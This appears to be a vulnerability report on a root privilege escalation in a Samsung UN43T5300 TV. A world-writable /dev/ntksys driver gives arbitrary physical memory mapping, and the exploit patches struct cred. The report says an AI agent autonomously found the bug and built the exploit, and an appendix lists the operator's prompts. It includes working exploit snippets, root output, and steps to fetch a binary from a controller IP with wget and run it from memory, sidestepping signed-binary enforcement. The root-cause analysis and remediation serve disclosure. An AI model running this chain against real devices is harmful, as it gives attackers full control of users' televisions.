# UN43T5300 Kernel LPE Report (`ntksys` physmap -> `cred` overwrite)

Date: 2026-03-31  
Target: Samsung UN43T5300 / Tizen Perf (KantS2)  
Starting point: post-browser-exploit shell as `User::Pkg::org.tizen.browser`

## Summary

On the UN43T5300, the shortest path from browser-app shell to root is a production kernel driver that should never have been reachable from an unprivileged process. `/dev/ntksys` is exposed as world-writable, and its `KER_SYS_IOC_SET_MEM_INFO` ioctl lets user space register an arbitrary physical base and size in a global table. The driver's `mmap` path later remaps that physical PFN straight into the caller's VMA with `vk_remap_pfn_range`.

That is already a full arbitrary physical read/write primitive. From there, the exploit does not need kernel code execution, symbols, or a kernel image on disk. It scans physical RAM for the current task's `struct cred`, zeros the UID/GID fields in place, and immediately becomes root.

This case is also notable for how little of the path was hand-held. The operator did not provide the vulnerable driver, the primitive, or the exploit recipe. What was provided was a foothold, a way to drive commands into the live TV shell, the released source tree, and a set of constraints about reachability and realism. Codex handled the rest: live enumeration, attack-surface selection, source audit, primitive derivation, PoC construction, exploit assembly, and root validation.

**At a glance**

- Starting privileges: browser app shell, `uid=5001`, `gid=100`
- Reachable attack surface: `/dev/ntksys` and `/dev/ntkhdma`, both world-writable
- Root cause: user-controlled physical address registration plus direct PFN remap
- Primitive: arbitrary physical memory read/write
- Impact: full local privilege escalation to root
- Reliability: high once scan windows are bounded from `/proc/cmdline`
- Autonomy model: operator supplied access and constraints; Codex produced the exploit chain
- Final artifact: `t5300_kernel_rw_chain.c`

## Scope and Threat Model

This report assumes no prior context and starts from a shell inside the browser application context.

- Initial context: `User::Pkg::org.tizen.browser` (`uid=5001`, `gid=100`)
- Constraints: no privileged capabilities, no `kallsyms`, no kernel image on disk
- Execution constraint: Samsung UEP blocks unsigned binaries from disk, so the final exploit is launched through the in-memory `memfd` wrapper in `pocs/run_mem.py`
- Success condition: current process becomes root without depending on kernel text corruption or reboot-persistent state

## Autonomous Setup and Division of Labor

The autonomy angle matters here because the chain was not produced from a preselected bug or a supplied exploit sketch. The user gave Codex an environment and a set of constraints, then Codex had to decide what was reachable, what was still present in source, and what path was worth operationalizing.

**What the operator provided**

- a post-browser shell in the browser app context (`uid=5001`)
- a controller host reachable over `ssh`
- a way to inject commands into the live TV shell via `tmux send-keys`
- log capture from that shell session
- the released KantS2 source tree
- operational constraints such as `armv7l`, static builds, and the requirement to use the `memfd` wrapper because unsigned binaries are blocked on disk

**What Codex did autonomously**

- enumerated the live environment from shell logs and identified the NTK stack as reachable attack surface
- cross-checked live reachability against released source instead of relying on theoretical CVE matching
- read the `ntksys` and `ntkhdma` drivers and isolated the physical-memory mapping primitive
- built the sanity PoCs to prove the primitive on-device before attempting escalation
- pivoted from unavailable interfaces such as `/proc/iomem` to `/proc/cmdline` to bound the physical scan
- derived the `cred`-matching heuristic, built the final combined exploit, and validated root

The result is important to state plainly: the user did not tell Codex "look at `ntksys`" or "patch `cred`." Codex had to discover that path and make it work under the target's operational constraints.

## What Was Reachable on the Device

Three observations drive the entire chain: the browser shell is unprivileged, dangerous NTK devices are reachable from that shell, and `/proc/cmdline` leaks enough RAM layout to make physical scanning practical.

**Browser user and kernel**

```text
id
uid=5001(owner) gid=100(users) groups=29(audio),44(video),100(users),201(display),1901(log),6509(app_logging),10001(priv_externalstorage),10502(priv_mediastorage),10503(priv_recorder),10704(priv_internet),10705(priv_network_get) context="User::Pkg::org.tizen.browser"

uname -a
Linux Samsung 4.1.10 #1 SMP PREEMPT Mon Feb 10 21:41:31 UTC 2020 armv7l GNU/Linux
```

**Relevant device nodes**

```text
crw-rw-rw-  1 root root 210,0  ntkhdma
crw-rw-rw-  1 root root 251,0  ntksys
crw-rw-rw-  1 root root 217,0  ntkxdma
```

**RAM layout leak from `/proc/cmdline`**

```text
dtsversion=5663453_kants2-1G-cma console=ttyS0,115200 rs232=0 earlyprintk maxcpus=4 no_console_suspend only_entry_model root=/dev/mmcblk0p18 KDUMP=16 SELP_ENABLE=20102011 _nvtca9-16m rootfstype=vdfs ro init=/sbin/init mem=400M@32M mem=256M@512M mem=192M@2048M vmalloc=300M rootwait quiet pba_none
```

The three RAM windows disclosed here are:

- `0x02000000 .. 0x1b000000` (`400M@32M`)
- `0x20000000 .. 0x30000000` (`256M@512M`)
- `0x80000000 .. 0x8c000000` (`192M@2048M`)

The final exploit only needed the low and high segments. The middle segment exists, but it was not required for a working root path on this target.

## Root Cause

### 1. `ntksys` is intentionally exposed to unprivileged callers

The shipping udev rule grants world-writable access to `/dev/ntksys`:

Source: `sources/20_DTV_KantS2/tztv-media-kants/99-tztv-media-kants.rules`

```text
KERNEL=="ntksys", MODE="0666", SECLABEL{smack}="*"
```

This is already a serious design error because `ntksys` is not a benign metadata interface. It is a memory-management interface.

### 2. User space controls the physical base and size

The driver interface is built around `ST_SYS_MEM_INFO`:

Source: `ker_sys.h`

```c
typedef struct _ST_SYS_MEM_INFO
{
    EN_SYS_MEM_TYPE enMemType;
    u32             u32Index;
    u32             u32Start;
    u32             u32Size;
} ST_SYS_MEM_INFO;

#define KER_SYS_IOC_SET_MEM_INFO _IOWR(VA_KER_SYS_IOC_ID, 1, ST_SYS_MEM_INFO)
```

`u32Start` and `u32Size` come directly from user space. Those are the only two values an attacker needs to turn this interface into a raw physmap.

### 3. `SET_MEM_INFO` validates the slot, not the physical range

The critical write path is in `ker_sys.c` around line 1158:

```c
u32Idx = stMemInfo.u32Index;
if( u32Idx >= MAX_UIO_MAPS )
    lError = -EFAULT;
else {
    g_astMemInfo[u32Idx].enMemType = stMemInfo.enMemType;
    g_astMemInfo[u32Idx].u32Index  = u32Idx;
    g_astMemInfo[u32Idx].u32Start  = stMemInfo.u32Start;
    g_astMemInfo[u32Idx].u32Size   = stMemInfo.u32Size;
    lError = ENOERR;
}
```

The driver checks whether the table index is valid. It does not check whether the requested physical range belongs to a kernel-owned buffer, whether it overlaps RAM, whether it crosses privileged regions, or whether the caller should be allowed to map it at all.

### 4. `mmap` remaps the chosen PFN verbatim

The corresponding map path is in `ker_sys.c` around line 1539:

```c
m = vma->vm_pgoff;
if( m >= MAX_UIO_MAPS ) return -EINVAL;
if( g_astMemInfo[m].enMemType == EN_SYS_MEM_TYPE_MAX ) return -EINVAL;

iRetVal = vk_remap_pfn_range( vma, vma->vm_start,
                              g_astMemInfo[m].u32Start >> PAGE_SHIFT,
                              vma->vm_end - vma->vm_start,
                              vma->vm_page_prot );
```

`vma->vm_pgoff` selects the slot, and the slot contents are attacker-controlled. The driver then passes the user-chosen PFN directly to `vk_remap_pfn_range`. At that point the kernel is no longer enforcing privilege separation for physical memory.

### 5. `ntkhdma` makes validation easier by leaking a physical address

`/dev/ntkhdma` provides a helpful supporting primitive:

Source: `ker_hdma.c`

```c
case KER_HDMA_IO_GET_BUFF_ADDR: {
    if( vk_copy_to_user( ( void __user * )u32Arg, &gu32HDMAMemPhysAddr, sizeof( u32 ) ) ) {
        iError = -EFAULT;
        break;
    }
    break;
}
```

This is not the core privilege-escalation bug, but it is useful operationally. It hands unprivileged code a known-good physical address that can be mapped through `ntksys` to prove the primitive works before touching arbitrary RAM.

## Why the Primitive Is Already Enough

This exploit path is data-only. Nothing in the chain depends on hijacking control flow.

Once user space can map arbitrary physical RAM read/write:

- `struct cred` becomes writable kernel data
- the lack of `kallsyms` stops mattering
- PXN and other execute-side mitigations stop mattering
- KASLR stops mattering because the exploit does not need virtual kernel addresses

The bug is therefore not "an info leak that helps exploitation." The bug is "unprivileged user space can ask the kernel to map arbitrary physical memory."

## Exploitation Path

### Step 1. Sanity-check the primitive with a known physical page

`ntkhdma_leak.c` retrieves the HDMA DMA buffer's physical address:

```c
if (ioctl(fd, KER_HDMA_IO_GET_BUFF_ADDR, &phys) != 0) { ... }
printf("HDMA buffer phys addr: 0x%08x\n", phys);
```

`ntksys_physmap.c` then registers that physical address with `ntksys`, maps it, and verifies read/write access:

```c
info.u32Start = phys;
info.u32Size = size;
ioctl(fd, KER_SYS_IOC_SET_MEM_INFO, &info);

off_t mmap_off = ((off_t)index) << 12; // pgoff selects the table slot
void *map = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, mmap_off);
```

Representative successful output looks like this:

```text
HDMA buffer phys addr: 0x84840000
HDMA buffer[0] = 0x00000010
read32: 00000010 fd02005c 00000000 fc0d0430
writing 0x41414141 to mapped address...
readback: 0x41414141
```

That is the moment the chain becomes real: a userspace store has become a write to a chosen physical page.

### Step 2. Bound the scan using `/proc/cmdline`

The final exploit does not scan blindly. It uses the RAM windows disclosed by `/proc/cmdline` and focuses on the two segments that were sufficient in practice:

```text
0x02000000 .. 0x1b000000
0x80000000 .. 0x8c000000
```

The high segment is especially useful because kernel heap and slab data reliably show up there on this platform. The low segment still contains enough live allocations that it is worth covering as well.

### Step 3. Find the current task's `cred`

On Linux 4.1 ARM32, the ID portion of `struct cred` is laid out as a run of 32-bit fields after the usage counter:

```text
[usage][uid][gid][euid][egid][suid][sgid][fsuid][fsgid]
```

The browser process gives us a stable pattern to search for: `uid=5001`, `gid=100`, repeated across the real/effective/saved/fs pairs. The final exploit scans 1 MB chunks and looks for that sequence with a sane-looking refcount in front of it:

```c
uint32_t usage = w[i];
if (usage == 0 || usage > 0x1000) continue;
if (w[i+1] != UID_MATCH) continue;
if (w[i+2] != GID_MATCH) continue;
if (w[i+3] != UID_MATCH) continue;
if (w[i+4] != GID_MATCH) continue;
if (w[i+5] != UID_MATCH) continue;
if (w[i+6] != GID_MATCH) continue;
if (w[i+7] != UID_MATCH) continue;
if (w[i+8] != GID_MATCH) continue;
```

This is deliberately conservative. The refcount check cuts down noise, and the repeated UID/GID pattern makes accidental matches unlikely.

### Step 4. Patch the IDs in place

Once a hit is found, the exploit zeros the eight UID/GID fields directly through the mapped physical page:

```c
w[i+1]=0; w[i+2]=0; w[i+3]=0; w[i+4]=0;
w[i+5]=0; w[i+6]=0; w[i+7]=0; w[i+8]=0;
```

Because the page aliases live kernel memory, there is no second trigger step. The current task is already pointing at that `cred`.

### Step 5. Consume the effect immediately

After patching the matching credentials, the final binary launches `/bin/sh`. No kernel return-to-user trickery is needed; the process is already root.

Representative success output from the final chain:

```text
[*] scanning range 0x02000000 - 0x1b000000
[*] map chunk phys=0x07400000 size=0x00100000
[+] cred match at phys 0x07498080 -> patching
[+] cred match at phys 0x07498580 -> patching
...
[+] patched creds, launching /bin/sh
id
uid=0(root) gid=0(root) groups=29(audio),44(video),100(users),201(display),1901(log),6509(app_logging),10001(priv_externalstorage),10502(priv_mediastorage),10503(priv_recorder),10704(priv_internet),10705(priv_network_get) context="User::Pkg::org.tizen.browser"
```

## Reliability Notes

- Reachability is stable because `/dev/ntksys` is `0666`.
- The exploit does not depend on a race or on corrupting control-flow state.
- `ntkhdma` provides a clean sanity target before the scan starts.
- `/proc/cmdline` keeps the scan inside plausible RAM windows.
- The final exploit only needed two ranges on this firmware, but extending it to the middle RAM window is straightforward if needed.

In other words: the chain is reliable because the kernel primitive is strong, not because the exploit is clever.

## Prompting and Operator Guidance

The operator prompts mattered because they constrained method and realism without supplying the bug or the exploit path. They forced the work to stay browser-reachable, source-confirmed, live-system grounded, statically built for ARMv7, and executable through the target's `memfd`-based workflow.

The exact prompt chronology is preserved in Appendix A. It is intentionally ordered because the order explains the session: first the objective, then the evidence requirements, then the live-environment constraints, then the build and deployment rules, and only after that the final "try it" confirmation loop.

## Impact

Any local code execution inside the browser app, or any other unprivileged app that can open `/dev/ntksys`, can turn that foothold into root. The boundary between user space and kernel space is effectively gone once this interface is exposed.

This is also unlikely to be an isolated engineering mistake. The number of world-writable NTK nodes on the device suggests the entire driver family deserves review for:

- direct physical memory exposure
- DMA address disclosure
- MMIO access
- similarly unsafe `mmap` paths

## Remediation

Minimum fixes:

1. Stop exposing `/dev/ntksys` to unprivileged callers. `0666` is indefensible for this interface.
2. Remove user control over raw physical base and size. Mapping requests must be restricted to kernel-allocated, driver-owned buffers only.
3. Reject arbitrary PFNs in the `mmap` path. Never pass caller-controlled physical addresses to `remap_pfn_range`.
4. Remove or privilege-gate `KER_HDMA_IO_GET_BUFF_ADDR`.
5. Audit other NTK devices created with permissive modes for similar memory, DMA, or MMIO exposure.

Defense-in-depth measures such as pointer restrictions or execute-side mitigations do not solve this bug class. The interface itself is the problem.

## Artifacts

Working artifacts and relevant source copies:

- `t5300_kernel_rw_chain.c`: final libc-free exploit
- `ntkhdma_leak.c`: HDMA leak sanity PoC
- `ntksys_physmap.c`: arbitrary physmap sanity PoC
- `ker_sys.c`: local copy of the vulnerable `ntksys` implementation
- `ker_sys.h`: ioctl and structure definitions
- `ker_hdma.c`: local copy of the HDMA implementation

Original source locations in the released firmware tree:

- `sources/20_DTV_KantS2/tztv-media-kants/ntkdriver/src/ksys/ker_sys.c`
- `sources/20_DTV_KantS2/tztv-media-kants/ntkdriver/inc/ker/ker_sys.h`
- `sources/20_DTV_KantS2/tztv-media-kants/ntkdriver/src/khdma/ker_hdma.c`
- `sources/20_DTV_KantS2/tztv-media-kants/99-tztv-media-kants.rules`

## Final Status

**Confirmed local privilege escalation:** browser-app shell (`uid=5001`) -> arbitrary physical memory read/write via `/dev/ntksys` -> `cred` overwrite -> root.

The exploit path is short, data-only, and operationally simple because the kernel is doing almost all of the hard work for the attacker.

## Appendix A. Prompt Chronology

This appendix preserves the operator prompts that materially changed the direction of the session. The order is original and matters. Usernames, IP addresses, hostnames, and personal paths have been anonymized. Profanity has been removed. Long prompts are quoted as excerpts with ellipses where nonessential detail was omitted.

For each item:

- `Prompt excerpt` preserves the important user wording
- `Why it mattered` explains what changed in the workflow
- `Response/effect` captures the relevant assistant outcome or session consequence

1. **Objective**

   Prompt excerpt:
   ```text
   The goal of this is to find a vulnerability in this TV to escalate privilege to root. It is either by device driver or publicly know vulnerabilities source like kernelCTF or known exploited vulnerabilities.
   ```

   Why it mattered:
   It set a concrete end state, but did not preselect the surface or the exploit class.

   Response/effect:
   Codex treated the session as an open-ended local LPE hunt rather than as a validation exercise for a known bug.

2. **Source-backed, time-bounded triage**

   Prompt excerpt:
   ```text
   You can find information about the kernel in the info log file. The firmware is released around 13 Feb 2020, so it makes sense to cross check the the source to all vulnerabilities from that day onwards... Make sure to THOROUGHLY check if a vulnerability actually still exists in this source code... reachability (must be reachable as the browser user context).
   ```

   Why it mattered:
   This prevented shallow CVE name-matching. A bug only counted if it was still present in the released source and actually reachable from the browser shell.

   Response/effect:
   Codex prioritized code that was both present in the KantS2 tree and reachable from the live app context.

3. **Live availability check**

   Prompt excerpt:
   ```text
   Make sure to check for the actual availability of the attack surface in the live system using the log info.
   ```

   Why it mattered:
   This forced every promising source finding to be checked against the actual box instead of becoming a source-only write-up.

   Response/effect:
   Device-node permissions, loaded modules, and RAM layout were all verified against the live shell log before the exploit path was treated as real.

4. **Ground-truth facts from the live box**

   Prompt excerpt:
   ```text
   uid=5001(owner) ... Linux Samsung 4.1.10 ... /dev/ntksys /dev/ntkhdma ... /proc/modules ... /proc/cmdline ...
   ```

   Why it mattered:
   This was the raw factual seed for the entire chain: browser UID/GID, kernel version, loaded NTK stack, world-writable device nodes, and RAM windows leaked by `/proc/cmdline`.

   Response/effect:
   Codex used the UID/GID pair for `cred` matching, the device list for surface selection, and the `mem=` entries for bounded physical scanning.

5. **Denied interface**

   Prompt excerpt:
   ```text
   iomem is denied access
   ```

   Why it mattered:
   It removed one of the easiest ways to map the physical address space and forced a pivot.

   Response/effect:
   Codex stopped depending on `/proc/iomem` and instead derived scan windows from `/proc/cmdline`, which was both accessible and sufficient.

6. **Execution rail: controller host plus shell listener**

   Prompt excerpt:
   ```text
   If you need to run the root shell comand:
   1. SSH to root@<controller-host>. This is the shell listener.
   2. tmux session 0. so use tmux send-keys to this. The log of the session is inside /root/<case> so read it to get the output.
   ```

   Why it mattered:
   This defined the operational topology. Commands were not being typed directly into the TV from the assistant's shell; they had to be staged through a controller and injected into the TV-side shell listener.

   Response/effect:
   Codex adapted its validation loop to a two-hop model: build on the controller, inject via `tmux`, and verify by reading the captured shell log.

7. **Build format**

   Prompt excerpt:
   ```text
   Build it statically because there may not be libs on there ... armv7l.
   ```

   Why it mattered:
   It removed any ambiguity about toolchain and linkage requirements for both PoCs and the final exploit.

   Response/effect:
   Codex produced static ARMv7 binaries and later collapsed the final exploit into a libc-free, syscall-only form.

8. **UEP constraint**

   Prompt excerpt:
   ```text
   Samsung blocks running unsigned binaries; run it via memfd wrapper.
   ```

   Why it mattered:
   This changed the final execution path from "download and execute" to "download and execute from memory."

   Response/effect:
   Codex used the in-memory wrapper workflow and treated it as a hard runtime constraint for all final validation.

9. **Transfer method**

   Prompt excerpt:
   ```text
   Use tmux send-keys to pull the binary down with wget, use the IP of the server.
   ```

   Why it mattered:
   This specified how binaries and PoCs had to reach the device.

   Response/effect:
   Codex used staged download-and-run workflows instead of assuming direct file copy into the TV shell.

10. **Fallback network path and writable staging**

    Prompt excerpt:
    ```text
    Okay shell is back... if the domain did not work, just use <controller-ip> ... write to a writable folder.
    ```

    Why it mattered:
    It resolved environmental fragility around name resolution and staging location.

    Response/effect:
    Codex switched to a stable direct-IP fetch path and used writable storage on the target for staging before `memfd` execution.

11. **Clarification about where commands must run**

   Prompt excerpt:
   ```text
   tmux sendkeys is where you use the shell that actually on THE TV. so USE IT to pull the binary down with wget...
   ```

    Why it mattered:
    It clarified an operational misunderstanding that could have invalidated the whole test loop.

    Response/effect:
    From that point on, Codex treated the TV shell and the controller shell as distinct environments with distinct responsibilities.

12. **Successful sanity-check output**

    Prompt excerpt:
    ```text
    python3 rmem.py ntkhdma_leak
    HDMA buffer phys addr: 0x84840000
    ```

    Why it mattered:
    This was the first hard confirmation that the HDMA path was live and that a concrete physical target existed for physmap validation.

    Response/effect:
    Codex used that address to justify the `ntksys` physmap sanity PoC before attempting the credential scan.

13. **Go-ahead for final execution**

   Prompt excerpt:
   ```text
   yeah okay try to check if it works
   ```

    Why it mattered:
    This was the point where the session moved from derivation and PoCs to the final end-to-end validation run.

    Response/effect:
    Codex ran the combined exploit path against the live target.

14. **First preserved assistant confirmation**

    Response excerpt:
    ```text
    Worked.
    ```

    Why it mattered:
    This is the shortest preserved acknowledgment of the final state change: the exploit chain had crossed from theory to validated root LPE.

    Response/effect:
    The final report could now be written as a confirmed exploit chain rather than as a candidate path.
